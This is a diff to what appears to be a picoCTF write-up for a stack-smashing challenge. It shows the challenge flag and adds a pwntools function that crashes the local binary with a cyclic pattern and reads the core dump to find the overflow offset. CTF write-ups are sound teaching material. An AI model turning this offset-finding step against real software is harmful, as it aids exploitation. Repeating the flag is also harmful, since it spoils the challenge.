@@ -98,3 +98,23 @@ void do_stuff(void)
 ```note
 picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}
 ```
+find the offset base buffer overflow
+
+```python
+def find_the_offset (NUM_CYCLIC_BYTES = 256):
+        payload = cyclic(NUM_CYCLIC_BYTES)
+        # Run the process once so that it crashes.
+        proc = process([exe.path])
+        # Send the payload.
+        proc.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)
+        proc.wait()
+        # Get the core dump.
+        core = proc.corefile
+        assert pack(core.fault_addr) in payload, "Faulting address not in the \
+                                                cyclic pattern."
+        # find offset
+        offset = cyclic_find(pack(core.fault_addr), n=4)
+        return offset # offset: 136
+      
+```
+
